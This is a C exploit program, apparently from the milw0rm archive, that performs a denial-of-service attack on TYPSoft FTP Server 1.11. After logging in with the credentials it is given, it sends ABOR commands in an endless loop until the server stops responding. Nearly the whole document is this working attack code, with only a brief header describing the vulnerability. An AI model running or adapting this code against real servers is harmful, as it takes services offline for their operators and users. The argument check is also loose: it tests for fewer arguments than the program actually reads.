/*
 Soft   :  TYPSoft FTP Server
 Version:  1.11

 Denial of Service in TYPSoft FTP Server up to 1.11 (no crash)
 Just the server is saturated, it stops responding.

 --------------------------------------------------------------------------------------
 The vulnerability is caused due to an error in handling the request (ABOR).
 This can be exploited to satured the FTP service, and make the server inaccessible 
 for several days.
 --------------------------------------------------------------------------------------

 Author	: Jonathan Salwan
 Mail	: submit AT shell-storm.org
 Web	: http://www.shell-storm.org
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int syntax(char *file)
	{
	fprintf(stderr,"TYPSoft FTP Server Remote Denial of Service\n");
	fprintf(stderr,"=>Syntax : <%s> <ip> <port> <user> <pass>\n",file);
	fprintf(stderr,"         : %s 127.0.0.1 21 anonymous aaa\n",file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 2)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[200];
	char answer[500];

        fprintf(stdout,"[+]TYPSoft FTP Server %s\n",argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
	
	if (srv_connect != -1)
 		{	
		recv(mysocket2,answer,sizeof(answer),0);

		fprintf(stdout,"[+]Connexion\t\t[OK]\n");
		
		sprintf(request, "USER %s\r\n", argv[3]);
		
			if (send(mysocket2,request,sizeof(request),0) == -1){
				fprintf(stderr,"[-]Send Request User\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				return 1;}
			fprintf(stdout,"[+]USER request\t\t[OK]\n");
                
		sprintf(request, "PASS %s\r\n", argv[4]);

                        if (send(mysocket2,request,sizeof(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
			fprintf(stdout,"[+]PASS request\t\t[OK]\n");

                sprintf(request, "ABOR\r\n");

	fprintf(stdout,"[+]If exploit is active, the server is saturated, it stops responding...\n");

		while(1){
                        if (send(mysocket2,request,sizeof(request),0) == -1){
                                fprintf(stderr,"[-]Send Request ABOR\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
			}

		}
		else{
			fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
			shutdown(mysocket2,1);
			return 1;}

	shutdown(mysocket2,1);

return 0;
}

// milw0rm.com [2009-05-11]